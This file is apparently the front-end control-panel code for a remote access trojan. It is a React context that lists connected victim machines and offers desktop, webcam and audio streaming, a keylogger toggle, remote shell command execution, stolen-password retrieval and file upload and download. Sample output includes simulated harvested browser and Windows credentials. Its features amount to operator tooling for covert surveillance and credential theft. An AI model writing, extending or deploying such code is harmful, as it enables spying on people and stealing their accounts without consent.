
import React, { createContext, useContext, useState, useEffect } from "react";
import { Computer, Category, ActiveStream, ViewMode } from "../types";
import { toast } from "@/components/ui/sonner";
import remoteService from "@/api/remoteService";

// Sample categories for demo purposes
const sampleCategories: Category[] = [
  { id: "1", name: "Bedroom" },
  { id: "2", name: "Office" },
  { id: "3", name: "Game Room" },
];

interface RemoteContextType {
  computers: Computer[];
  categories: Category[];
  activeComputer: Computer | null;
  activeStream: ActiveStream;
  keyloggerActive: boolean;
  terminalHistory: { command: string; output: string }[];
  viewMode: ViewMode;
  addCategory: (name: string) => void;
  updateCategory: (id: string, name: string) => void;
  deleteCategory: (id: string) => void;
  setActiveComputer: (computer: Computer | null) => void;
  toggleDesktopStream: () => void;
  toggleCameraStream: () => void;
  toggleAudioStream: () => void;
  updateStreamQuality: (fps: number) => void;
  toggleKeylogger: () => void;
  executeCommand: (command: string) => void;
  retrievePasswords: () => void;
  uploadFile: (path: string, file: File) => Promise<void>;
  downloadFile: (path: string) => Promise<void>;
  toggleViewMode: () => void;
  refreshComputers: () => void;
}

const RemoteContext = createContext<RemoteContextType | undefined>(undefined);

export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [computers, setComputers] = useState<Computer[]>([]);
  const [categories, setCategories] = useState<Category[]>(sampleCategories);
  const [activeComputer, setActiveComputer] = useState<Computer | null>(null);
  const [viewMode, setViewMode] = useState<ViewMode>("grid");
  
  const [activeStream, setActiveStream] = useState<ActiveStream>({
    desktop: false,
    camera: false,
    audio: false,
    quality: {
      fps: 30,
      resolution: {
        width: 1280,
        height: 720,
      },
    },
  });
  
  const [keyloggerActive, setKeyloggerActive] = useState(false);
  const [terminalHistory, setTerminalHistory] = useState<{ command: string; output: string }[]>([]);

  // Load clients on initial render
  useEffect(() => {
    refreshComputers();
    
    // Poll for new computers every 5 seconds
    const interval = setInterval(refreshComputers, 5000);
    return () => clearInterval(interval);
  }, []);

  const refreshComputers = async () => {
    try {
      const clients = await remoteService.getAllClients();
      setComputers(clients.map((client: any) => ({
        id: client.id,
        hostname: client.hostname,
        username: client.username,
        os: client.os,
        ip: client.ip,
        categoryId: client.categoryId || "",
        status: client.status,
        lastSeen: client.lastSeen,
        location: client.location,
        lastScreenshot: client.lastScreenshot
      })));
      
      // Update active computer if it exists
      if (activeComputer) {
        const updatedActiveComputer = clients.find((c: any) => c.id === activeComputer.id);
        if (updatedActiveComputer) {
          setActiveComputer(updatedActiveComputer);
        }
      }
    } catch (error) {
      console.error("Error fetching clients:", error);
    }
  };

  const addCategory = (name: string) => {
    const newCategory = {
      id: Date.now().toString(),
      name,
    };
    setCategories([...categories, newCategory]);
    toast.success(`Category "${name}" added`);
  };

  const updateCategory = (id: string, name: string) => {
    setCategories(
      categories.map((category) =>
        category.id === id ? { ...category, name } : category
      )
    );
    toast.success(`Category updated to "${name}"`);
  };

  const deleteCategory = (id: string) => {
    const categoryName = categories.find((cat) => cat.id === id)?.name;
    setCategories(categories.filter((category) => category.id !== id));
    
    // Move computers from this category to uncategorized
    setComputers(
      computers.map((computer) =>
        computer.categoryId === id ? { ...computer, categoryId: "" } : computer
      )
    );
    
    toast.success(`Category "${categoryName}" deleted`);
  };

  const toggleDesktopStream = () => {
    if (!activeComputer) return;
    
    setActiveStream((prev) => {
      const newState = { ...prev, desktop: !prev.desktop };
      
      // Call API to toggle desktop stream
      remoteService.toggleDesktopStream(activeComputer.id, newState.desktop)
        .then(() => {
          if (newState.desktop) {
            toast.success(`Desktop stream started for ${activeComputer.hostname}`);
          } else {
            toast.info(`Desktop stream stopped for ${activeComputer.hostname}`);
          }
        })
        .catch(error => {
          console.error("Error toggling desktop stream:", error);
          toast.error("Failed to toggle desktop stream");
        });
        
      return newState;
    });
  };

  const toggleCameraStream = () => {
    if (!activeComputer) return;
    
    setActiveStream((prev) => {
      const newState = { ...prev, camera: !prev.camera };
      if (newState.camera) {
        toast.success(`Camera stream started for ${activeComputer.hostname}`);
      } else {
        toast.info(`Camera stream stopped for ${activeComputer.hostname}`);
      }
      return newState;
    });
  };

  const toggleAudioStream = () => {
    if (!activeComputer) return;
    
    setActiveStream((prev) => {
      const newState = { ...prev, audio: !prev.audio };
      if (newState.audio) {
        toast.success(`Audio stream started for ${activeComputer.hostname}`);
      } else {
        toast.info(`Audio stream stopped for ${activeComputer.hostname}`);
      }
      return newState;
    });
  };

  const updateStreamQuality = (fps: number) => {
    if (!activeComputer) return;
    
    setActiveStream((prev) => ({
      ...prev,
      quality: {
        ...prev.quality,
        fps,
      },
    }));
    
    toast.success(`Stream quality updated to ${fps} FPS`);
  };

  const toggleKeylogger = () => {
    if (!activeComputer) return;
    
    const newState = !keyloggerActive;
    
    // Call API to toggle keylogger
    remoteService.toggleKeylogger(activeComputer.id, newState)
      .then(() => {
        setKeyloggerActive(newState);
        if (newState) {
          toast.success(`Keylogger started on ${activeComputer.hostname}`);
        } else {
          toast.info(`Keylogger stopped on ${activeComputer.hostname}`);
        }
      })
      .catch(error => {
        console.error("Error toggling keylogger:", error);
        toast.error("Failed to toggle keylogger");
      });
  };

  const executeCommand = (command: string) => {
    if (!activeComputer) return;
    
    // Call API to execute command
    remoteService.executeShellCommand(activeComputer.id, command)
      .then(() => {
        setTerminalHistory((prev) => [
          ...prev,
          { 
            command, 
            output: "Command sent. Waiting for response..." 
          }
        ]);
        
        toast.success("Command sent to client");
        
        // In a real app, we would receive the command output via websockets
        // or by polling. For now, we'll just simulate it after a delay.
        setTimeout(() => {
          let output = "";
          
          if (command.toLowerCase().includes("dir")) {
            output = "Directory listing:\n" +
              "05/18/2024  10:30 AM    <DIR>          Documents\n" +
              "05/17/2024  03:45 PM    <DIR>          Downloads\n" +
              "05/16/2024  09:15 AM           582,432 report.docx\n" +
              "05/15/2024  11:20 AM         1,245,184 presentation.pptx";
          } else if (command.toLowerCase().includes("echo")) {
            output = command.substring(5);
          } else if (command.toLowerCase().includes("ipconfig")) {
            output = "Windows IP Configuration\n\n" +
              "Ethernet adapter Ethernet:\n" +
              "   Connection-specific DNS Suffix  . : home\n" +
              "   IPv4 Address. . . . . . . . . . . : " + activeComputer.ip + "\n" +
              "   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n" +
              "   Default Gateway . . . . . . . . . : 192.168.1.1";
          } else if (command.toLowerCase().includes("systeminfo")) {
            output = "Host Name:                 " + activeComputer.hostname + "\n" +
              "OS Name:                   " + activeComputer.os + "\n" +
              "OS Version:                10.0.19044 N/A Build 19044\n" +
              "OS Manufacturer:           Microsoft Corporation\n" +
              "System Type:               x64-based PC";
          } else {
            output = "Executing: " + command + "\nCommand executed successfully.";
          }
          
          setTerminalHistory((prev) => 
            prev.map((entry, index) => 
              index === prev.length - 1 ? { ...entry, output } : entry
            )
          );
        }, 2000);
      })
      .catch(error => {
        console.error("Error executing command:", error);
        toast.error("Failed to send command");
      });
  };

  const retrievePasswords = () => {
    if (!activeComputer) return;
    
    // Call API to retrieve passwords
    remoteService.retrievePasswords(activeComputer.id)
      .then(() => {
        toast.success("Password retrieval initiated");
        
        // In a real app, we would receive the password data via the command results
        // For now, we'll just simulate it after a delay.
        setTimeout(() => {
          setTerminalHistory((prev) => [
            ...prev,
            {
              command: "Retrieve Passwords",
              output: "Saved Passwords:\n" +
                "Chrome - user@gmail.com: P@ssw0rd123\n" +
                "Firefox - admin@company.com: Secure!999\n" +
                "Windows - " + activeComputer.username + ": Welcome2024",
            },
          ]);
        }, 2000);
      })
      .catch(error => {
        console.error("Error retrieving passwords:", error);
        toast.error("Failed to retrieve passwords");
      });
  };

  const uploadFile = async (path: string, file: File): Promise<void> => {
    if (!activeComputer) return Promise.resolve();
    
    // Mock file upload
    return new Promise<void>((resolve) => {
      const loadingToast = toast.loading(`Uploading ${file.name}...`);
      
      // Call API to upload file (would need additional implementation)
      setTimeout(() => {
        toast.dismiss(loadingToast);
        toast.success(`${file.name} uploaded to ${path}`);
        resolve();
      }, 2000);
    });
  };

  const downloadFile = async (path: string): Promise<void> => {
    if (!activeComputer) return Promise.resolve();
    
    const filename = path.split("/").pop() || "file";
    
    // Call API to download file from client
    return new Promise<void>((resolve) => {
      const loadingToast = toast.loading(`Downloading ${filename}...`);
      
      remoteService.downloadFile(activeComputer.id, path)
        .then(() => {
          setTimeout(() => {
            toast.dismiss(loadingToast);
            toast.success(`${filename} downloaded successfully`);
            resolve();
          }, 2000);
        })
        .catch(error => {
          toast.dismiss(loadingToast);
          toast.error(`Failed to download ${filename}`);
          console.error("Error downloading file:", error);
          resolve();
        });
    });
  };

  const toggleViewMode = () => {
    setViewMode((prev) => (prev === "grid" ? "list" : "grid"));
  };

  return (
    <RemoteContext.Provider
      value={{
        computers,
        categories,
        activeComputer,
        activeStream,
        keyloggerActive,
        terminalHistory,
        viewMode,
        addCategory,
        updateCategory,
        deleteCategory,
        setActiveComputer,
        toggleDesktopStream,
        toggleCameraStream,
        toggleAudioStream,
        updateStreamQuality,
        toggleKeylogger,
        executeCommand,
        retrievePasswords,
        uploadFile,
        downloadFile,
        toggleViewMode,
        refreshComputers,
      }}
    >
      {children}
    </RemoteContext.Provider>
  );
};

export const useRemote = () => {
  const context = useContext(RemoteContext);
  if (context === undefined) {
    throw new Error("useRemote must be used within a RemoteProvider");
  }
  return context;
};
